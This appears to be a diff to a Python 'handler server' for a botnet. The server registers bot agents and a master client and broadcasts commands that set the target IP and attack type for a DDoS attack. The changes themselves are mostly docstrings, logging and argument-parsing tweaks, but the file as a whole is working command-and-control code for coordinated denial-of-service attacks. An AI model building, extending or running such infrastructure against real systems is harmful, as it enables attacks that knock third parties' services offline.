@@ -1,8 +1,18 @@
+""" Handler Server
+
+This script runs a server acting as a middleman for a master client and bot agents to perform
+a type of DDoS attack on a target server. 
+
+To execute this script, it requires python 3.9
+
+source: https://pythonprogramming.net/server-chatroom-sockets-tutorial-python-3/ 
+"""
 import socket
 import sys
 import select
 import argparse
 import time
+import traceback
 
 RECV_BUFFER = 4096
 ENCODING = 'utf-8'
@@ -45,32 +55,35 @@ class Server():
 
                 for notified_socket in exception_sockets:
                     self._disconnect_wrapper(notified_socket)
-
         except KeyboardInterrupt:
-            print('caught keyboard interrupt, exiting')
+            print('caught keyboard interrupt, exiting...')
         except Exception as e:
-            print(f'ran into an error:\n\t{e}')
+            traceback.print_exc()
         finally:
             self.sock.close()
             sys.exit()
+
         return
 
     def _accept_wrapper(self, notified_sock: socket.socket) -> None:
         self.socket_list.append(notified_sock)
         print(f'New client connected > {str(notified_sock.getpeername())}')
-        # Ask client for identification
+
+        # Ask client to identify themselves
         notified_sock.send('whoami:_'.encode(ENCODING))
+
         return
 
     def _request_router(self, sock: socket.socket) -> None:
         sock_addr = sock.getpeername()
         recv_data = sock.recv(RECV_BUFFER).decode(ENCODING)
-        print(f'received request from ${recv_data}')
+        print(f'received request from ${sock_addr}')
         try:
             if recv_data:
                 try:
                     req_type, req_body = recv_data.split(':')
-                    if req_type == 'iam':   # iam request applies to both master and bot agent
+                    # iam request applies to both master and bot agent
+                    if req_type == 'iam':
                         self._iam_handler(sock, req_body)
                     elif sock in self.bot_agents:
                         self._bot_handler(sock, req_type, req_body)
@@ -84,12 +97,14 @@ class Server():
                             ENCODING)
                         sock.send(response)
                 except ValueError:
-                    print(f'cannot parse request!')
+                    print('cannot parse request!')
                     response = '_:error:cannot parse request'.encode(ENCODING)
                     sock.send(response)
+
             # No data received means that client closed gracefully
             else:
                 self._disconnect_wrapper(sock)
+
         # Abrupt client disconnect
         except Exception as e:
             print(e)
@@ -113,7 +128,7 @@ class Server():
 
             response = 'iam:success:bot identified'
 
-            # update client bot list
+            # send master current bot list
             if self.master_client:
                 bots = self._get_bot_list()
                 self.master_client.sendall(f'listbot:{bots}'.encode(ENCODING))
@@ -128,14 +143,12 @@ class Server():
             bots = self._get_bot_list()
             response = f'listbot:{bots}'
         elif type == 'changeip':
-            # TODO check if valid ip/address
             self._bot_broadcast(f'changeip:{body}'.encode(ENCODING))
             self.target_address = body
             # Reflects change in target IP
             print(f'Target IP is: {self.target_address}')
             return
         elif type == 'changeattk':
-            # TODO: check if valid attack
             self._bot_broadcast(f'changeattk:{body}'.encode(ENCODING))
             self.attk_type = body
             return
@@ -184,7 +197,6 @@ class Server():
                 bots = self._get_bot_list()
                 self.master_client.sendall(
                     f'listbot:{bots}'.encode(ENCODING))
-
             print(f'bot agent {sock_addr_str} disconnected')
         # master client disconnect
         elif self.master_client == sock:
@@ -204,10 +216,11 @@ class Server():
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description='Handler Server')
-    parser.add_argument('-a', metavar='HOST_ADDRESS', type=str,
-                        default='', help='Interface the server listens at')
-    parser.add_argument('-p', metavar='PORT', type=int, default=8080,
+    parser = argparse.ArgumentParser(
+        description='Handler server for performing DDoS attacks')
+    parser.add_argument('-a', '--address', type=str,
+                        default='', help='interface the server listens at')
+    parser.add_argument('-p', '--port', type=int, default=8080,
                         help='TCP port (default 8080)')
     args = parser.parse_args()
 
